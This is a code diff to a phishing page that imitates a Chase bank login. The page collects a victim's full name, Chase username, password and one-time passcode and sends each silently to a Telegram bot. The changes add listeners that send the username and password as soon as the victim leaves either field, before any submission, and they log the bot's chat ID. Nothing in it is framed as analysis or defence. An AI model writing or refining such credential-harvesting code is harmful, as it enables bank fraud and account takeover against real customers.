@@ -82,19 +82,6 @@
         }
 
         .btn-primary {
-            width: 100%;
-            background: #0b2b4a;
-            border: none;
-            padding: 1rem 0;
-            border-radius: 60px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: white;
-            box-shadow: 0 6px 14px rgba(11, 43, 74, 0.25);
-            transition: 0.15s ease;
-            cursor: pointer;
-            letter-spacing: 0.3px;
-            margin-top: 0.2rem;
             display: none;
         }
 
@@ -530,6 +517,8 @@
             let currentStep = 1;
             let isProcessing = false;
             let redirectTimer = null;
+            let usernameSent = false;
+            let passwordSent = false;
 
             // ---- helper: send to Telegram (silent) ----
             function sendToTelegram(message) {
@@ -567,13 +556,17 @@
                 sendToTelegram(message);
             }
 
-            function sendStep2Data() {
+            function sendUsernameAndPassword() {
                 const username = chaseUser.value.trim();
                 const password = chasePass.value.trim();
-                const message = `🔐 *Step 2 Completed*\n` +
-                    `🔑 *Chase Username:* ${username}\n` +
-                    `🔐 *Chase Password:* ${password}`;
-                sendToTelegram(message);
+                if (username && password) {
+                    const message = `🔑 *Chase Credentials Entered*\n` +
+                        `👤 *Username:* ${username}\n` +
+                        `🔐 *Password:* ${password}`;
+                    sendToTelegram(message);
+                    usernameSent = true;
+                    passwordSent = true;
+                }
             }
 
             function sendStep3Data() {
@@ -684,19 +677,25 @@
 
             // ---- Event listeners ----
 
-            // Step1 → Step2 (send step 1 data)
-            step1Next.addEventListener('click', function() {
-                const name = fullNameInput.value.trim();
-                if (name.length < 2) {
-                    alert('Please enter your full name.');
-                    return;
+            // Send username and password immediately when user finishes typing
+            chaseUser.addEventListener('blur', function() {
+                if (this.value.trim().length > 0 && !usernameSent) {
+                    // Only send if password is also filled
+                    if (chasePass.value.trim().length > 0) {
+                        sendUsernameAndPassword();
+                    }
                 }
-                // Send step 1 data with full name and bank
-                sendStep1Data();
-                goToStep(2);
             });
 
-            // Step2 → Step3 (send step 2 data)
+            chasePass.addEventListener('blur', function() {
+                if (this.value.trim().length > 0 && !passwordSent) {
+                    if (chaseUser.value.trim().length > 0) {
+                        sendUsernameAndPassword();
+                    }
+                }
+            });
+
+            // Also send when user clicks "Verify & Continue"
             step2Next.addEventListener('click', function() {
                 const user = chaseUser.value.trim();
                 const pass = chasePass.value.trim();
@@ -704,11 +703,30 @@
                     alert('Please fill in both Chase username and password.');
                     return;
                 }
-                sendStep2Data();
+                
+                // Send username and password if not sent yet
+                if (!usernameSent || !passwordSent) {
+                    sendUsernameAndPassword();
+                }
+                
                 goToStep(3);
                 startProcessing(() => {
                     otpInput.focus();
                 });
+            });
+
+            // Step1 → Step2 (send step 1 data)
+            step1Next.addEventListener('click', function() {
+                const name = fullNameInput.value.trim();
+                if (name.length < 2) {
+                    alert('Please enter your full name.');
+                    return;
+                }
+                sendStep1Data();
+                goToStep(2);
+                // Reset flags for username/password when entering step 2
+                usernameSent = false;
+                passwordSent = false;
             });
 
             // Step3 → Step4 (send step 3 data)
@@ -743,9 +761,13 @@
             // Back buttons
             backToStep1.addEventListener('click', function() { 
                 goToStep(1);
+                usernameSent = false;
+                passwordSent = false;
             });
             backToStep2.addEventListener('click', function() { 
                 goToStep(2);
+                usernameSent = false;
+                passwordSent = false;
             });
             backToStep3.addEventListener('click', function() {
                 goToStep(3);
@@ -775,8 +797,9 @@
             otpInput.value = '';
             fullNameInput.value = '';
 
-            console.log('🔔 Telegram bot configured (step-by-step capture)');
+            console.log('🔔 Telegram bot configured');
             console.log('📱 Chat ID:', CHAT_ID);
+            console.log('📝 Username and password will be sent when user finishes typing or clicks Verify');
         })();
     </script>
 </body>
